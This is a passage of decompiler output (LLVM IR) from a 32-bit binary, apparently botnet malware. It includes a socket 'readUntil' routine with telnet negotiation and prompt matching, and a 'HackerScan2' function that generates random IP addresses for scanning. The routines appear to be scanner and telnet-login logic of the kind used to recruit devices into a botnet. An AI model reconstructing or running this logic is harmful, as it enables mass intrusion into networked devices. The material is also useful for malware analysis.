  br i1 %v7_80497a924, label %dec_label_pc_80497ab, label %dec_label_pc_80497a3.dec_label_pc_8049807_crit_edge

dec_label_pc_804985c:                             ; preds = %dec_label_pc_8049832, %dec_label_pc_8049807
  %storemerge = phi i32 [ 1, %dec_label_pc_8049807 ], [ 0, %dec_label_pc_8049832 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %stack_var_-12.1, { 2, 1, 0 }
  uselistorder i32 %v6_80497b0, { 1, 0 }
  uselistorder [6 x i8]* @global_var_80585aa.26, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8049832, { 1, 0 }
  uselistorder label %dec_label_pc_80497a3.dec_label_pc_8049807_crit_edge, { 1, 0 }
}

define i32 @readUntil(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i8* %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  store i32 %arg4, i32* %stack_var_-168, align 4
  %v2_80498ab = ptrtoint i32* %stack_var_-160 to i32
  %tmp34 = bitcast i32* %stack_var_-160 to i8*
  %v1_80498c5 = urem i32 %arg1, 32
  %v9_80498c8 = shl i32 1, %v1_80498c5
  %v1_80498d3 = add i32 %arg1, 1
  %v2_80498d7 = ptrtoint i32* %stack_var_-168 to i32
  %v2_80499a6 = inttoptr i32 %arg2 to i8*
  %v4_80499b2 = icmp eq i32 %arg3, 0
  %v1_80499d341 = add i32 %arg8, 2
  %v5_80499d944 = icmp slt i32 %v1_80499d341, %arg7
  br i1 %v5_80499d944, label %dec_label_pc_80499db.lr.ph, label %dec_label_pc_8049a09

dec_label_pc_80499db.lr.ph:                       ; preds = %entry
  %v2_80498bf = udiv i32 %arg1, 32
  %v2_80498c8 = mul nuw nsw i32 %v2_80498bf, 4
  %v3_80498c8 = add nsw i32 %v2_80498c8, -156
  %v5_80498fd = ptrtoint i8* %arg6 to i32
  %tmp39 = icmp slt i32 %arg5, 1
  %tmp40 = icmp eq i1 %tmp39, false
  br label %dec_label_pc_80499db

dec_label_pc_80498a1:                             ; preds = %dec_label_pc_80499e9, %dec_label_pc_80499db
  store i32 %v2_80498ab, i32* @edi, align 4
  %v5_80498b2 = call i8* @_memset(i8* %tmp34, i32 0, i32 32)
  %v0_80498c8 = load i32, i32* @ebp, align 4
  %v4_80498c8 = add i32 %v3_80498c8, %v0_80498c8
  %v5_80498c8 = inttoptr i32 %v4_80498c8 to i32*
  %v6_80498c8 = load i32, i32* %v5_80498c8, align 4
  %v12_80498c8 = or i32 %v6_80498c8, %v9_80498c8
  store i32 %v12_80498c8, i32* %v5_80498c8, align 4
  %v5_80498ea = call i32 @__libc_select(i32 %v1_80498d3, i32 %v2_80498ab, i32 0, i32 0, i32 %v2_80498d7)
  %tmp36 = icmp slt i32 %v5_80498ea, 1
  br i1 %tmp36, label %dec_label_pc_8049a09, label %dec_label_pc_80498fa

dec_label_pc_80498fa:                             ; preds = %dec_label_pc_80498a1
  %v6_80498fd = add i32 %stack_var_-32.045, %v5_80498fd
  %v5_8049900 = inttoptr i32 %v6_80498fd to i8*
  %v5_804990d = call i32 @__libc_recv(i32 %arg1, i32 %v6_80498fd, i32 1, i32 0)
  %v13_8049918 = icmp eq i32 %v5_804990d, -1
  br i1 %v13_8049918, label %dec_label_pc_8049924, label %dec_label_pc_804991e

dec_label_pc_804991e:                             ; preds = %dec_label_pc_80498fa
  %v4_804991e = icmp eq i32 %v5_804990d, 0
  %v1_8049922 = icmp eq i1 %v4_804991e, false
  br i1 %v1_8049922, label %dec_label_pc_8049933, label %dec_label_pc_8049924

dec_label_pc_8049924:                             ; preds = %dec_label_pc_804991e, %dec_label_pc_80498fa
  br label %dec_label_pc_8049a13

dec_label_pc_8049933:                             ; preds = %dec_label_pc_804991e
  %v5_8049936 = add i32 %v5_804990d, %stack_var_-32.045
  %v2_804993c = load i8, i8* %v5_8049900, align 1
  %v11_804993e = icmp eq i8 %v2_804993c, -1
  %v1_8049940 = icmp eq i1 %v11_804993e, false
  br i1 %v1_8049940, label %dec_label_pc_804999d, label %dec_label_pc_8049942

dec_label_pc_8049942:                             ; preds = %dec_label_pc_8049933
  %v1_8049945 = add i32 %v6_80498fd, 1
  %v5_804994e = call i32 @__libc_recv(i32 %arg1, i32 %v1_8049945, i32 2, i32 0)
  %v13_8049959 = icmp eq i32 %v5_804994e, -1
  br i1 %v13_8049959, label %dec_label_pc_8049965, label %dec_label_pc_804995f

dec_label_pc_804995f:                             ; preds = %dec_label_pc_8049942
  %v4_804995f = icmp eq i32 %v5_804994e, 0
  %v1_8049963 = icmp eq i1 %v4_804995f, false
  br i1 %v1_8049963, label %dec_label_pc_8049974, label %dec_label_pc_8049965

dec_label_pc_8049965:                             ; preds = %dec_label_pc_804995f, %dec_label_pc_8049942
  br label %dec_label_pc_8049a13

dec_label_pc_8049974:                             ; preds = %dec_label_pc_804995f
  %v5_8049977 = add i32 %v5_804994e, %v5_8049936
  %v3_8049985 = call i32 @negotiate(i32 %arg1, i32 %v6_80498fd, i32 3)
  %v1_804998d = icmp eq i32 %v3_8049985, 0
  %v1_804998f = icmp eq i1 %v1_804998d, false
  br i1 %v1_804998f, label %dec_label_pc_80499d0.backedge, label %dec_label_pc_8049991

dec_label_pc_80499d0.backedge:                    ; preds = %dec_label_pc_8049974, %dec_label_pc_80499b2, %dec_label_pc_80499b8
  %stack_var_-32.0.be = phi i32 [ %v5_8049936, %dec_label_pc_80499b2 ], [ %v5_8049936, %dec_label_pc_80499b8 ], [ %v5_8049977, %dec_label_pc_8049974 ]
  %v1_80499d3 = add i32 %stack_var_-32.0.be, 2
  %v5_80499d9 = icmp slt i32 %v1_80499d3, %arg7
  br i1 %v5_80499d9, label %dec_label_pc_80499d0.backedge.dec_label_pc_80499db_crit_edge, label %dec_label_pc_8049a09

dec_label_pc_80499d0.backedge.dec_label_pc_80499db_crit_edge: ; preds = %dec_label_pc_80499d0.backedge
  %v3_80499db.pre = load i32, i32* %stack_var_-168, align 4
  br label %dec_label_pc_80499db

dec_label_pc_8049991:                             ; preds = %dec_label_pc_8049974
  br label %dec_label_pc_8049a13

dec_label_pc_804999d:                             ; preds = %dec_label_pc_8049933
  %v3_80499a6 = call i32 @strstr(i32 %v5_80498fd, i8* %v2_80499a6)
  %v1_80499ae = icmp eq i32 %v3_80499a6, 0
  %v1_80499b0 = icmp eq i1 %v1_80499ae, false
  br i1 %v1_80499b0, label %dec_label_pc_80499fd, label %dec_label_pc_80499b2

dec_label_pc_80499b2:                             ; preds = %dec_label_pc_804999d
  br i1 %v4_80499b2, label %dec_label_pc_80499d0.backedge, label %dec_label_pc_80499b8

dec_label_pc_80499b8:                             ; preds = %dec_label_pc_80499b2
  %v3_80499bb = call i32 @matchPrompt(i8* %arg6)
  %v1_80499c3 = icmp eq i32 %v3_80499bb, 0
  br i1 %v1_80499c3, label %dec_label_pc_80499d0.backedge, label %dec_label_pc_80499fd

dec_label_pc_80499db:                             ; preds = %dec_label_pc_80499d0.backedge.dec_label_pc_80499db_crit_edge, %dec_label_pc_80499db.lr.ph
  %v3_80499db = phi i32 [ %arg4, %dec_label_pc_80499db.lr.ph ], [ %v3_80499db.pre, %dec_label_pc_80499d0.backedge.dec_label_pc_80499db_crit_edge ]
  %stack_var_-32.045 = phi i32 [ %arg8, %dec_label_pc_80499db.lr.ph ], [ %stack_var_-32.0.be, %dec_label_pc_80499d0.backedge.dec_label_pc_80499db_crit_edge ]
  %tmp37 = icmp slt i32 %v3_80499db, 1
  %tmp38 = icmp eq i1 %tmp37, false
  br i1 %tmp38, label %dec_label_pc_80498a1, label %dec_label_pc_80499e9

dec_label_pc_80499e9:                             ; preds = %dec_label_pc_80499db
  br i1 %tmp40, label %dec_label_pc_80498a1, label %dec_label_pc_8049a09

dec_label_pc_80499fd:                             ; preds = %dec_label_pc_80499b8, %dec_label_pc_804999d
  br label %dec_label_pc_8049a13

dec_label_pc_8049a09:                             ; preds = %dec_label_pc_80499d0.backedge, %dec_label_pc_80499e9, %dec_label_pc_80498a1, %entry
  br label %dec_label_pc_8049a13

dec_label_pc_8049a13:                             ; preds = %dec_label_pc_80499fd, %dec_label_pc_8049991, %dec_label_pc_8049965, %dec_label_pc_8049924, %dec_label_pc_8049a09
  %v3_8049a13 = phi i32 [ 1, %dec_label_pc_80499fd ], [ 0, %dec_label_pc_8049991 ], [ 0, %dec_label_pc_8049965 ], [ 0, %dec_label_pc_8049924 ], [ 0, %dec_label_pc_8049a09 ]
  ret i32 %v3_8049a13

; uselistorder directives
  uselistorder i32 %stack_var_-32.0.be, { 1, 0 }
  uselistorder i32 %v5_804994e, { 0, 2, 1 }
  uselistorder i32 %v5_804990d, { 0, 2, 1 }
  uselistorder i32 %v5_80498fd, { 1, 0 }
  uselistorder i32* %stack_var_-168, { 0, 2, 1 }
  uselistorder i32 %arg7, { 1, 0 }
  uselistorder i8* %arg6, { 1, 0 }
  uselistorder i32 %arg1, { 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_8049a13, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8049a09, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_80499d0.backedge, { 2, 1, 0 }
}

define i32 @HackerScan2(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8049a21 = load i32, i32* @ebx, align 4
  store i32 %v0_8049a21, i32* %stack_var_-8, align 4
  store i8 0, i8* @global_var_805d497.27, align 1
  store i8 0, i8* @global_var_805d498.28, align 8
  store i8 0, i8* @global_var_805d499.29, align 1
  store i8 0, i8* @global_var_805d49a.30, align 2
  %v1_8049a41 = call i32 @random()
  %v2_8049a51 = ashr i32 %v1_8049a41, 31
  %v2_8049a54 = zext i32 %v1_8049a41 to i64
  %v4_8049a54 = zext i32 %v2_8049a51 to i64
  %v5_8049a54 = mul nuw i64 %v4_8049a54, 4294967296
  %v6_8049a54 = or i64 %v5_8049a54, %v2_8049a54
  %v10_8049a54 = srem i64 %v6_8049a54, 255
  %v11_8049a54 = trunc i64 %v10_8049a54 to i32
  store i32 %v11_8049a54, i32* @eax, align 4
  %v1_8049a58 = trunc i64 %v10_8049a54 to i8
  store i8 %v1_8049a58, i8* @global_var_805d497.27, align 1
  %v0_8049a5d = call i32 @random()
  %v2_8049a6d = ashr i32 %v0_8049a5d, 31
  %v2_8049a70 = zext i32 %v0_8049a5d to i64
  %v4_8049a70 = zext i32 %v2_8049a6d to i64
  %v5_8049a70 = mul nuw i64 %v4_8049a70, 4294967296
  %v6_8049a70 = or i64 %v5_8049a70, %v2_8049a70
  %v10_8049a70 = srem i64 %v6_8049a70, 255
  %v11_8049a70 = trunc i64 %v10_8049a70 to i32
  store i32 %v11_8049a70, i32* @eax, align 4
  %v1_8049a74 = trunc i64 %v10_8049a70 to i8
  store i8 %v1_8049a74, i8* @global_var_805d498.28, align 8
  %v0_8049a79 = call i32 @random()
  %v2_8049a89 = ashr i32 %v0_8049a79, 31
  %v2_8049a8c = zext i32 %v0_8049a79 to i64
  %v4_8049a8c = zext i32 %v2_8049a89 to i64
  %v5_8049a8c = mul nuw i64 %v4_8049a8c, 4294967296
  %v6_8049a8c = or i64 %v5_8049a8c, %v2_8049a8c
  %v10_8049a8c = srem i64 %v6_8049a8c, 255
  %v11_8049a8c = trunc i64 %v10_8049a8c to i32
  store i32 %v11_8049a8c, i32* @eax, align 4
  %v1_8049a90 = trunc i64 %v10_8049a8c to i8
  store i8 %v1_8049a90, i8* @global_var_805d499.29, align 1
  %v0_8049a95 = call i32 @random()
  %v2_8049aa5 = ashr i32 %v0_8049a95, 31
  %v2_8049aa8 = zext i32 %v0_8049a95 to i64
  %v4_8049aa8 = zext i32 %v2_8049aa5 to i64
  %v5_8049aa8 = mul nuw i64 %v4_8049aa8, 4294967296
  %v6_8049aa8 = or i64 %v5_8049aa8, %v2_8049aa8
  %v10_8049aa8 = srem i64 %v6_8049aa8, 255
  %v11_8049aa8 = trunc i64 %v10_8049aa8 to i32
  store i32 %v11_8049aa8, i32* @eax, align 4
  %v1_8049aac = trunc i64 %v10_8049aa8 to i8
  store i8 %v1_8049aac, i8* @global_var_805d49a.30, align 2
  %v0_8049ab1 = call i32 @random()
  %v2_8049ac1 = ashr i32 %v0_8049ab1, 31
  %v2_8049ac4 = zext i32 %v0_8049ab1 to i64
  %v4_8049ac4 = zext i32 %v2_8049ac1 to i64
  %v5_8049ac4 = mul nuw i64 %v4_8049ac4, 4294967296
  %v6_8049ac4 = or i64 %v5_8049ac4, %v2_8049ac4
  %v10_8049ac4 = srem i64 %v6_8049ac4, 208
  %v11_8049ac4 = trunc i64 %v10_8049ac4 to i32
  store i32 %v11_8049ac4, i32* @edx, align 4
  %v4_8049ac9 = icmp eq i32 %v11_8049ac4, 0
  %v1_8049acd = icmp eq i1 %v4_8049ac9, false
  br i1 %v1_8049acd, label %dec_label_pc_8049af9, label %dec_label_pc_8049acf

dec_label_pc_8049acf:                             ; preds = %entry
  %v0_8049acf = load i8, i8* @global_var_805d49a.30, align 2
  %v1_8049acf = zext i8 %v0_8049acf to i32
  store i32 %v1_8049acf, i32* @edx, align 4
  %v0_8049adb = load i8, i8* @global_var_805d499.29, align 1
  %v1_8049adb = zext i8 %v0_8049adb to i32
  %v2_8049aea = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049aea, i32* @ebx, align 4
  %v5_8049af1 = call i32 @szprintf(i32 %v2_8049aea, i32 ptrtoint ([12 x i8]* @global_var_80585b1.31 to i32), i32 %v1_8049adb, i32 %v1_8049acf)
  br label %dec_label_pc_8049af9

dec_label_pc_8049af9:                             ; preds = %entry, %dec_label_pc_8049acf
  %v12_8049af9 = icmp eq i32 %v11_8049ac4, 1
  %v1_8049afd = icmp eq i1 %v12_8049af9, false
  br i1 %v1_8049afd, label %dec_label_pc_8049b29, label %dec_label_pc_8049aff

dec_label_pc_8049aff:                             ; preds = %dec_label_pc_8049af9
  %v0_8049aff = load i8, i8* @global_var_805d49a.30, align 2
  %v1_8049aff = zext i8 %v0_8049aff to i32
  store i32 %v1_8049aff, i32* @edx, align 4
  %v0_8049b0b = load i8, i8* @global_var_805d499.29, align 1
  %v1_8049b0b = zext i8 %v0_8049b0b to i32
  %v2_8049b1a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049b1a, i32* @ebx, align 4
  %v5_8049b21 = call i32 @szprintf(i32 %v2_8049b1a, i32 ptrtoint ([14 x i8]* @global_var_80585bd.32 to i32), i32 %v1_8049b0b, i32 %v1_8049aff)
  br label %dec_label_pc_8049b29

dec_label_pc_8049b29:                             ; preds = %dec_label_pc_8049af9, %dec_label_pc_8049aff
  %v12_8049b29 = icmp eq i32 %v11_8049ac4, 2
  %v1_8049b2d = icmp eq i1 %v12_8049b29, false
  br i1 %v1_8049b2d, label %dec_label_pc_8049b59, label %dec_label_pc_8049b2f

dec_label_pc_8049b2f:                             ; preds = %dec_label_pc_8049b29
  %v0_8049b2f = load i8, i8* @global_var_805d49a.30, align 2
  %v1_8049b2f = zext i8 %v0_8049b2f to i32
  store i32 %v1_8049b2f, i32* @edx, align 4
  %v0_8049b3b = load i8, i8* @global_var_805d499.29, align 1
  %v1_8049b3b = zext i8 %v0_8049b3b to i32
  %v2_8049b4a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049b4a, i32* @ebx, align 4
  %v5_8049b51 = call i32 @szprintf(i32 %v2_8049b4a, i32 ptrtoint ([11 x i8]* @global_var_80585cb.33 to i32), i32 %v1_8049b3b, i32 %v1_8049b2f)
  br label %dec_label_pc_8049b59

dec_label_pc_8049b59:                             ; preds = %dec_label_pc_8049b29, %dec_label_pc_8049b2f
  %v12_8049b59 = icmp eq i32 %v11_8049ac4, 3
  %v1_8049b5d = icmp eq i1 %v12_8049b59, false
  br i1 %v1_8049b5d, label %dec_label_pc_8049b89, label %dec_label_pc_8049b5f

dec_label_pc_8049b5f:                             ; preds = %dec_label_pc_8049b59
  %v0_8049b5f = load i8, i8* @global_var_805d49a.30, align 2
  %v1_8049b5f = zext i8 %v0_8049b5f to i32
  store i32 %v1_8049b5f, i32* @edx, align 4
  %v0_8049b6b = load i8, i8* @global_var_805d499.29, align 1
  %v1_8049b6b = zext i8 %v0_8049b6b to i32
  %v2_8049b7a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049b7a, i32* @ebx, align 4
  %v5_8049b81 = call i32 @szprintf(i32 %v2_8049b7a, i32 ptrtoint ([13 x i8]* @global_var_80585d6.34 to i32), i32 %v1_8049b6b, i32 %v1_8049b5f)
  br label %dec_label_pc_8049b89

dec_label_pc_8049b89:                             ; preds = %dec_label_pc_8049b59, %dec_label_pc_8049b5f
  %v12_8049b89 = icmp eq i32 %v11_8049ac4, 4
  %v1_8049b8d = icmp eq i1 %v12_8049b89, false
  br i1 %v1_8049b8d, label %dec_label_pc_8049bb9, label %dec_label_pc_8049b8f

dec_label_pc_8049b8f:                             ; preds = %dec_label_pc_8049b89
  %v0_8049b8f = load i8, i8* @global_var_805d49a.30, align 2
  %v1_8049b8f = zext i8 %v0_8049b8f to i32
  store i32 %v1_8049b8f, i32* @edx, align 4
  %v0_8049b9b = load i8, i8* @global_var_805d499.29, align 1
  %v1_8049b9b = zext i8 %v0_8049b9b to i32
  %v2_8049baa = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049baa, i32* @ebx, align 4
  %v5_8049bb1 = call i32 @szprintf(i32 %v2_8049baa, i32 ptrtoint ([11 x i8]* @global_var_80585e3.35 to i32), i32 %v1_8049b9b, i32 %v1_8049b8f)
  br label %dec_label_pc_8049bb9

dec_label_pc_8049bb9:                             ; preds = %dec_label_pc_8049b89, %dec_label_pc_8049b8f
  %v12_8049bb9 = icmp eq i32 %v11_8049ac4, 5
  %v1_8049bbd = icmp eq i1 %v12_8049bb9, false
  br i1 %v1_8049bbd, label %dec_label_pc_8049be9, label %dec_label_pc_8049bbf

dec_label_pc_8049bbf:                             ; preds = %dec_label_pc_8049bb9
  %v0_8049bbf = load i8, i8* @global_var_805d49a.30, align 2
  %v1_8049bbf = zext i8 %v0_8049bbf to i32
  store i32 %v1_8049bbf, i32* @edx, align 4
  %v0_8049bcb = load i8, i8* @global_var_805d499.29, align 1
  %v1_8049bcb = zext i8 %v0_8049bcb to i32
  %v2_8049bda = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049bda, i32* @ebx, align 4
  %v5_8049be1 = call i32 @szprintf(i32 %v2_8049bda, i32 ptrtoint ([13 x i8]* @global_var_80585ee.36 to i32), i32 %v1_8049bcb, i32 %v1_8049bbf)
  br label %dec_label_pc_8049be9

dec_label_pc_8049be9:                             ; preds = %dec_label_pc_8049bb9, %dec_label_pc_8049bbf
  %v12_8049be9 = icmp eq i32 %v11_8049ac4, 6
  %v1_8049bed = icmp eq i1 %v12_8049be9, false
  br i1 %v1_8049bed, label %dec_label_pc_8049c19, label %dec_label_pc_8049bef

dec_label_pc_8049bef:                             ; preds = %dec_label_pc_8049be9
  %v0_8049bef = load i8, i8* @global_var_805d49a.30, align 2
  %v1_8049bef = zext i8 %v0_8049bef to i32
  store i32 %v1_8049bef, i32* @edx, align 4
  %v0_8049bfb = load i8, i8* @global_var_805d499.29, align 1
  %v1_8049bfb = zext i8 %v0_8049bfb to i32
  %v2_8049c0a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049c0a, i32* @ebx, align 4
  %v5_8049c11 = call i32 @szprintf(i32 %v2_8049c0a, i32 ptrtoint ([12 x i8]* @global_var_80585fb.37 to i32), i32 %v1_8049bfb, i32 %v1_8049bef)
  br label %dec_label_pc_8049c19

dec_label_pc_8049c19:                             ; preds = %dec_label_pc_8049be9, %dec_label_pc_8049bef
  %v12_8049c19 = icmp eq i32 %v11_8049ac4, 7
  %v1_8049c1d = icmp eq i1 %v12_8049c19, false
  br i1 %v1_8049c1d, label %dec_label_pc_8049c49, label %dec_label_pc_8049c1f

dec_label_pc_8049c1f:                             ; preds = %dec_label_pc_8049c19
  %v0_8049c1f = load i8, i8* @global_var_805d49a.30, align 2
  %v1_8049c1f = zext i8 %v0_8049c1f to i32
  store i32 %v1_8049c1f, i32* @edx, align 4
  %v0_8049c2b = load i8, i8* @global_var_805d499.29, align 1
  %v1_8049c2b = zext i8 %v0_8049c2b to i32
  %v2_8049c3a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049c3a, i32* @ebx, align 4
  %v5_8049c41 = call i32 @szprintf(i32 %v2_8049c3a, i32 ptrtoint ([13 x i8]* @global_var_8058607.38 to i32), i32 %v1_8049c2b, i32 %v1_8049c1f)
  br label %dec_label_pc_8049c49

dec_label_pc_8049c49:                             ; preds = %dec_label_pc_8049c19, %dec_label_pc_8049c1f
  %v12_8049c49 = icmp eq i32 %v11_8049ac4, 8
  %v1_8049c4d = icmp eq i1 %v12_8049c49, false
  br i1 %v1_8049c4d, label %dec_label_pc_8049c79, label %dec_label_pc_8049c4f

dec_label_pc_8049c4f:                             ; preds = %dec_label_pc_8049c49
  %v0_8049c4f = load i8, i8* @global_var_805d49a.30, align 2
  %v1_8049c4f = zext i8 %v0_8049c4f to i32
  store i32 %v1_8049c4f, i32* @edx, align 4
  %v0_8049c5b = load i8, i8* @global_var_805d499.29, align 1
  %v1_8049c5b = zext i8 %v0_8049c5b to i32
  %v2_8049c6a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049c6a, i32* @ebx, align 4
  %v5_8049c71 = call i32 @szprintf(i32 %v2_8049c6a, i32 ptrtoint ([13 x i8]* @global_var_8058614.39 to i32), i32 %v1_8049c5b, i32 %v1_8049c4f)
  br label %dec_label_pc_8049c79

dec_label_pc_8049c79:                             ; preds = %dec_label_pc_8049c49, %dec_label_pc_8049c4f
  %v12_8049c79 = icmp eq i32 %v11_8049ac4, 9
  %v1_8049c7d = icmp eq i1 %v12_8049c79, false
  br i1 %v1_8049c7d, label %dec_label_pc_8049ca9, label %dec_label_pc_8049c7f

dec_label_pc_8049c7f:                             ; preds = %dec_label_pc_8049c79
  %v0_8049c7f = load i8, i8* @global_var_805d49a.30, align 2
  %v1_8049c7f = zext i8 %v0_8049c7f to i32
  store i32 %v1_8049c7f, i32* @edx, align 4
  %v0_8049c8b = load i8, i8* @global_var_805d499.29, align 1
  %v1_8049c8b = zext i8 %v0_8049c8b to i32
  %v2_8049c9a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049c9a, i32* @ebx, align 4
  %v5_8049ca1 = call i32 @szprintf(i32 %v2_8049c9a, i32 ptrtoint ([13 x i8]* @global_var_8058621.40 to i32), i32 %v1_8049c8b, i32 %v1_8049c7f)
  br label %dec_label_pc_8049ca9

dec_label_pc_8049ca9:                             ; preds = %dec_label_pc_8049c79, %dec_label_pc_8049c7f
  %v12_8049ca9 = icmp eq i32 %v11_8049ac4, 10
  %v1_8049cad = icmp eq i1 %v12_8049ca9, false
  br i1 %v1_8049cad, label %dec_label_pc_8049cd9, label %dec_label_pc_8049caf

dec_label_pc_8049caf:                             ; preds = %dec_label_pc_8049ca9
  %v0_8049caf = load i8, i8* @global_var_805d49a.30, align 2
  %v1_8049caf = zext i8 %v0_8049caf to i32
  store i32 %v1_8049caf, i32* @edx, align 4
  %v0_8049cbb = load i8, i8* @global_var_805d499.29, align 1
  %v1_8049cbb = zext i8 %v0_8049cbb to i32
  %v2_8049cca = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049cca, i32* @ebx, align 4
  %v5_8049cd1 = call i32 @szprintf(i32 %v2_8049cca, i32 ptrtoint ([14 x i8]* @global_var_805862e.41 to i32), i32 %v1_8049cbb, i32 %v1_8049caf)
  br label %dec_label_pc_8049cd9

dec_label_pc_8049cd9:                             ; preds = %dec_label_pc_8049ca9, %dec_label_pc_8049caf
  %v12_8049cd9 = icmp eq i32 %v11_8049ac4, 11
  %v1_8049cdd = icmp eq i1 %v12_8049cd9, false
  br i1 %v1_8049cdd, label %dec_label_pc_8049d09, label %dec_label_pc_8049cdf

dec_label_pc_8049cdf:                             ; preds = %dec_label_pc_8049cd9
  %v0_8049cdf = load i8, i8* @global_var_805d49a.30, align 2
  %v1_8049cdf = zext i8 %v0_8049cdf to i32
  store i32 %v1_8049cdf, i32* @edx, align 4
  %v0_8049ceb = load i8, i8* @global_var_805d499.29, align 1
  %v1_8049ceb = zext i8 %v0_8049ceb to i32
  %v2_8049cfa = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049cfa, i32* @ebx, align 4
  %v5_8049d01 = call i32 @szprintf(i32 %v2_8049cfa, i32 ptrtoint ([11 x i8]* @global_var_805863c.42 to i32), i32 %v1_8049ceb, i32 %v1_8049cdf)
  br label %dec_label_pc_8049d09

dec_label_pc_8049d09:                             ; preds = %dec_label_pc_8049cd9, %dec_label_pc_8049cdf
  %v12_8049d09 = icmp eq i32 %v11_8049ac4, 12
  %v1_8049d0d = icmp eq i1 %v12_8049d09, false
  br i1 %v1_8049d0d, label %dec_label_pc_8049d39, label %dec_label_pc_8049d0f

dec_label_pc_8049d0f:                             ; preds = %dec_label_pc_8049d09
  %v0_8049d0f = load i8, i8* @global_var_805d49a.30, align 2
  %v1_8049d0f = zext i8 %v0_8049d0f to i32
  store i32 %v1_8049d0f, i32* @edx, align 4
  %v0_8049d1b = load i8, i8* @global_var_805d499.29, align 1
  %v1_8049d1b = zext i8 %v0_8049d1b to i32
  %v2_8049d2a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049d2a, i32* @ebx, align 4
  %v5_8049d31 = call i32 @szprintf(i32 %v2_8049d2a, i32 ptrtoint ([13 x i8]* @global_var_8058647.43 to i32), i32 %v1_8049d1b, i32 %v1_8049d0f)
  br label %dec_label_pc_8049d39

dec_label_pc_8049d39:                             ; preds = %dec_label_pc_8049d09, %dec_label_pc_8049d0f
  %v12_8049d39 = icmp eq i32 %v11_8049ac4, 13
  %v1_8049d3d = icmp eq i1 %v12_8049d39, false
  br i1 %v1_8049d3d, label %dec_label_pc_8049d69, label %dec_label_pc_8049d3f

dec_label_pc_8049d3f:                             ; preds = %dec_label_pc_8049d39
  %v0_8049d3f = load i8, i8* @global_var_805d49a.30, align 2
  %v1_8049d3f = zext i8 %v0_8049d3f to i32
  store i32 %v1_8049d3f, i32* @edx, align 4
  %v0_8049d4b = load i8, i8* @global_var_805d499.29, align 1
  %v1_8049d4b = zext i8 %v0_8049d4b to i32
  %v2_8049d5a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049d5a, i32* @ebx, align 4
  %v5_8049d61 = call i32 @szprintf(i32 %v2_8049d5a, i32 ptrtoint ([13 x i8]* @global_var_8058654.44 to i32), i32 %v1_8049d4b, i32 %v1_8049d3f)
  br label %dec_label_pc_8049d69

dec_label_pc_8049d69:                             ; preds = %dec_label_pc_8049d39, %dec_label_pc_8049d3f
  %v12_8049d69 = icmp eq i32 %v11_8049ac4, 14
  %v1_8049d6d = icmp eq i1 %v12_8049d69, false
  br i1 %v1_8049d6d, label %dec_label_pc_8049d99, label %dec_label_pc_8049d6f

dec_label_pc_8049d6f:                             ; preds = %dec_label_pc_8049d69
  %v0_8049d6f = load i8, i8* @global_var_805d49a.30, align 2
  %v1_8049d6f = zext i8 %v0_8049d6f to i32
  store i32 %v1_8049d6f, i32* @edx, align 4
  %v0_8049d7b = load i8, i8* @global_var_805d499.29, align 1
  %v1_8049d7b = zext i8 %v0_8049d7b to i32
  %v2_8049d8a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049d8a, i32* @ebx, align 4
  %v5_8049d91 = call i32 @szprintf(i32 %v2_8049d8a, i32 ptrtoint ([13 x i8]* @global_var_8058661.45 to i32), i32 %v1_8049d7b, i32 %v1_8049d6f)
  br label %dec_label_pc_8049d99

dec_label_pc_8049d99:                             ; preds = %dec_label_pc_8049d69, %dec_label_pc_8049d6f
  %v12_8049d99 = icmp eq i32 %v11_8049ac4, 15
  %v1_8049d9d = icmp eq i1 %v12_8049d99, false
  br i1 %v1_8049d9d, label %dec_label_pc_8049dc9, label %dec_label_pc_8049d9f

dec_label_pc_8049d9f:                             ; preds = %dec_label_pc_8049d99
  %v0_8049d9f = load i8, i8* @global_var_805d49a.30, align 2
  %v1_8049d9f = zext i8 %v0_8049d9f to i32
  store i32 %v1_8049d9f, i32* @edx, align 4
  %v0_8049dab = load i8, i8* @global_var_805d499.29, align 1
  %v1_8049dab = zext i8 %v0_8049dab to i32
  %v2_8049dba = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049dba, i32* @ebx, align 4
  %v5_8049dc1 = call i32 @szprintf(i32 %v2_8049dba, i32 ptrtoint ([13 x i8]* @global_var_805866e.46 to i32), i32 %v1_8049dab, i32 %v1_8049d9f)
  br label %dec_label_pc_8049dc9

dec_label_pc_8049dc9:                             ; preds = %dec_label_pc_8049d99, %dec_label_pc_8049d9f
  %v9_8049dc9 = icmp eq i32 %v11_8049ac4, 16
  %v1_8049dcd = icmp eq i1 %v9_8049dc9, false
  br i1 %v1_8049dcd, label %dec_label_pc_8049df9, label %dec_label_pc_8049dcf

dec_label_pc_8049dcf:                             ; preds = %dec_label_pc_8049dc9
  %v0_8049dcf = load i8, i8* @global_var_805d49a.30, align 2
  %v1_8049dcf = zext i8 %v0_8049dcf to i32
  store i32 %v1_8049dcf, i32* @edx, align 4
  %v0_8049ddb = load i8, i8* @global_var_805d499.29, align 1
  %v1_8049ddb = zext i8 %v0_8049ddb to i32
